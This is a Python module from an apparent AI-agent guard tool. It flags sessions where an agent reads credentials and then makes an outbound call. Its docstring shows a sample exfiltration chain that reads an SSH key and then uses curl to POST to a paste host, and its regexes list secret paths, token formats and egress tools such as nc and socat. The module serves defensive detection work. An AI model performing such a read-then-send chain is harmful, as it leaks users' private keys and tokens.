"""Session taint tracking: catch "read a secret, then send something out" across tool calls.

Single-call checks miss this chain. Step 1 (`cat ~/.ssh/id_rsa`, or reading a `.env` while debugging)
is often legitimate. Step 2 (`curl -X POST https://paste.example.com -d @notes.txt`) can look harmless,
and provenance won't flag it if the user named the host. Together they are the classic exfiltration
pattern: private data plus an untrusted instruction plus a way out ("lethal trifecta").

This works purely on provenance spans and the pending call, so it runs the same way for the Claude Code
hook (spans from the transcript), datasets (spans stored with each row) and the MCP proxy (spans from
results that flowed through it).

Signals:
  taint_sources   which secret kinds this session has already touched: a `file:` span whose path looks
                  like a credential, or any span whose text contains secret-looking content
  is_egress       the pending call can move data off the machine (network commands, fetches, messaging
                  or publishing MCP tools, writes outside the project)
  tainted_egress  taint_sources is non-empty and the call is egress
  secret_in_args  the call's own arguments reference a secret path or contain secret content
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from pathlib import PurePosixPath
from typing import Any

from .provenance import Span

SECRET_PATH = re.compile(
    r"(\.ssh/|id_rsa|id_ed25519|id_ecdsa|\.aws/credentials|\.aws/config|\.netrc|(^|/)\.env(\.|\b)|\.npmrc|"
    r"\.pypirc|kube/config|\.docker/config\.json|\.git-credentials|gh/hosts\.yml|\.gnupg/|secrets?\.(ya?ml|json)|"
    r"credentials\.json|service[-_]account.*\.json|\.pem\b|\.key\b|/etc/shadow)",
    re.I,
)

SECRET_CONTENT: dict[str, re.Pattern] = {
    "private_key": re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY"),
    "aws_access_key": re.compile(r"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"),
    "github_token": re.compile(
        r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{30,}\b|\bgithub_pat_[A-Za-z0-9_]{40,}\b"
    ),
    "slack_token": re.compile(r"\bxox[abprs]-[A-Za-z0-9-]{10,}\b"),
    "api_key": re.compile(r"\b(?:sk|pk|rk)[-_](?:live|test|proj|ant)?[-_]?[A-Za-z0-9]{20,}\b"),
    "assignment": re.compile(
        # \w* prefix: env files use DB_PASSWORD=, STRIPE_SECRET=, ...; value must be a literal of 12+ chars
        r"(?i)\b\w*(?:password|passwd|secret|api[_-]?key|access[_-]?token|auth[_-]?token)\b\s*[:=]\s*"
        r"['\"]?(?![\w.]*\()[^\s'\"$]{12,}"
    ),
}

_EGRESS_BASH = re.compile(
    r"\b(curl|wget|nc|ncat|netcat|socat|scp|sftp|rsync|ssh|ftp|telnet|aws\s+s3\s+(cp|sync)|gsutil\s+cp|"
    r"git\s+push|gh\s+(gist|issue|pr|api)|npm\s+publish|twine\s+upload|sendmail|mail\b)",
    re.I,
)
_EGRESS_MCP = re.compile(
    r"(send|post|email|mail|upload|create|comment|publish|share|message|tweet|webhook)", re.I
)
_WEB_TOOLS = {"WebFetch", "WebSearch"}
_WRITE_TOOLS = {"Write", "Edit", "MultiEdit", "NotebookEdit"}


@dataclass
class TaintReport:
    taint_sources: list[str] = field(default_factory=list)
    is_egress: bool = False
    egress_kind: str | None = None
    secret_in_args: list[str] = field(default_factory=list)

    @property
    def tainted_egress(self) -> bool:
        return bool(self.taint_sources) and self.is_egress


def secret_kinds(text: str) -> list[str]:
    return [name for name, pat in SECRET_CONTENT.items() if pat.search(text)]


def taint_sources(spans: list[Span]) -> list[str]:
    """Secret kinds this session has touched, e.g. ["file:~/.ssh/id_rsa", "content:private_key"]."""
    found: list[str] = []
    for span in spans:
        if span.source.startswith("file:") and SECRET_PATH.search(span.source[5:]):
            found.append(span.source)
        if span.source in ("user", "system"):
            continue  # the user pasting a key into chat is their choice, not a tool leaking it
        found += [f"content:{k}" for k in secret_kinds(span.text)]
    return sorted(set(found))


def _inside(path: str, cwd: str | None) -> bool:
    if not cwd or not path:
        return False
    p = PurePosixPath(path)
    if not p.is_absolute():
        return ".." not in p.parts
    try:
        p.relative_to(PurePosixPath(cwd))
    except ValueError:
        return False
    return ".." not in p.parts


def egress_kind(tool: str, args: dict[str, Any], cwd: str | None = None) -> str | None:
    if tool == "Bash":
        m = _EGRESS_BASH.search(str(args.get("command", "")))
        return f"bash:{m.group(1).split()[0].lower()}" if m else None
    if tool in _WEB_TOOLS:
        return f"web:{tool}"
    if tool.startswith("mcp__"):
        name = tool.split("__")[-1]
        return f"mcp:{name}" if _EGRESS_MCP.search(name) else None
    if tool in _WRITE_TOOLS:
        path = str(args.get("file_path") or args.get("notebook_path") or "")
        return None if _inside(path, cwd) else "write_outside_project"
    return None


def analyse(tool: str, args: dict[str, Any], spans: list[Span], cwd: str | None = None) -> TaintReport:
    args_text = json.dumps(args, ensure_ascii=False)
    in_args = [f"path:{m.group(0)}" for m in SECRET_PATH.finditer(args_text)]
    in_args += [f"content:{k}" for k in secret_kinds(args_text)]
    kind = egress_kind(tool, args, cwd)
    return TaintReport(taint_sources(spans), kind is not None, kind, sorted(set(in_args)))
